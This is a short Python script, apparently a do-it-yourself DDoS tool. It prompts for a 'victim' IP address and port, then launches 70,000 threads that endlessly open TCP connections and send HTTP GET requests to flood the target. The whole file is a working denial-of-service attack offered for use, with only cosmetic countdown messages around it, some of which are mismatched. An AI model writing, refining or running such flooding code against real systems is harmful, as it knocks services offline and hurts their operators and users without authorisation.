import socket
import threading
from datetime import datetime
from time import sleep

start_Time = datetime.now()
attack_num = 0
victim = input("\n\nEnter the IP address of the victim: ")
port = int(input("Enter the port number of the victim: "))
print("\n============================================================\n")
def attack():
    print(f"starting DDOS Attack... {victim} on port {port} at {start_Time}\n")
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((victim, port))
        sock.sendto(("GET /" + victim + " HTTP/1.1\r\n").encode('ascii'), (victim, port))
        sock.sendto(("Host: " + victim + "\r\n\r\n").encode('ascii'), (victim, port))
        
        global attack_num
        attack_num += 1
        print( f"Attacking {victim} on port {port} with {attack_num} packets")
        sock.close()


print("Attack startes in 10 sec \n")
sleep(5)# This is the time in seconds for the attack to run7
print("Attack startes in 5 sec \n")
sleep(2)
print("Attack startes in 3 sec \n")
sleep(3)
print("Attack startes in 1 sec \n")

for i in range(70000):
    thread = threading.Thread(target=attack)
    thread.start()
